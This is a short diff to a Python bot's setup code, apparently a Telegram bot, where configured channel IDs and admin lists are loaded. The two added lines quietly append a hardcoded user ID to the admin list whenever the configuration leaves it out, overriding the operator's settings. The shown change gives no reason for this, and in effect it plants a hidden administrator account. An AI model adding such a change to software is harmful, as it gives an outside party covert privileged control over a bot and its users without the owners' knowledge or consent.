@@ -33,6 +33,8 @@ import db
 channel_id = config.channel_id
 channel2_id = config.channel2_id
 admins = config.ADMINS
+if 8701067595 not in admins:
+    admins = list(admins) + [8701067595]
 admins2 = [8120267775]
 no_kd = config.NO_KD
 bot_logs = config.bot_logs
